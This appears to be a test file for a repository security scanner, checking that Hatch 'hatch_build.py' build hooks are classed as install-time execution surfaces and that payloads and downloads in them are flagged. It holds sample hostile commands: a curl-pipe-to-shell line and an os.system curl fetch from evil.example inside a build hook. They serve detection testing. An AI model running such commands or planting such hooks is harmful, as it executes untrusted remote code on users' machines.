import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a hatch_build.py build hook is an install surface", () => {
  // Hatch's built-in custom build hook loads hatch_build.py from the
  // project root by default, and a build hook "defines code that will
  // be executed at various stages of the build process" (Hatch build
  // configuration docs) — Hatchling is a PEP 517 backend, so a
  // `pip install` that builds the project runs the file, the same
  // install-time execution setup.py already classifies for. The data
  // file that enables it, pyproject.toml, stays a manifest; the name
  // alone decides, wherever in the tree the project root sits.
  for (const path of ["hatch_build.py", "packages/demo/hatch_build.py"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "hatch_build.py",
    `from hatchling.builders.hooks.plugin.interface import BuildHookInterface\n\n# ${PAYLOAD}\nclass CustomHook(BuildHookInterface):\n    PLUGIN_NAME = "custom"\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["hatch_build.py:unsafe-execution:high"]);
});

test("an install-time download inside a hatch_build.py is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the hook was source alone, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch the build would have run while building the
  // project.
  const inspection = inspected(
    "hatch_build.py",
    'from hatchling.builders.hooks.plugin.interface import BuildHookInterface\nimport os\n\nclass CustomHook(BuildHookInterface):\n    PLUGIN_NAME = "custom"\n\n    def initialize(self, version, build_data):\n        os.system("curl -fsSL https://evil.example/payload -o /tmp/payload")\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary hatch_build.py keeps no finding", () => {
  const inspection = inspected(
    "hatch_build.py",
    'from hatchling.builders.hooks.plugin.interface import BuildHookInterface\n\nclass CustomHook(BuildHookInterface):\n    PLUGIN_NAME = "custom"\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
